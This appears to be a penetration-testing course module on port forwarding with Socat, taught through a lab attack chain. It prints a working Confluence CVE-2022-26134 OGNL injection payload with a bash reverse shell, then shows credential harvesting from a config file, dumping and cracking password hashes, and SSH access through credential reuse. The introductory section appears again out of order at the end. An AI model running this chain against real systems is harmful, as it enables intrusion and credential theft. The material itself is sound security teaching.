Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

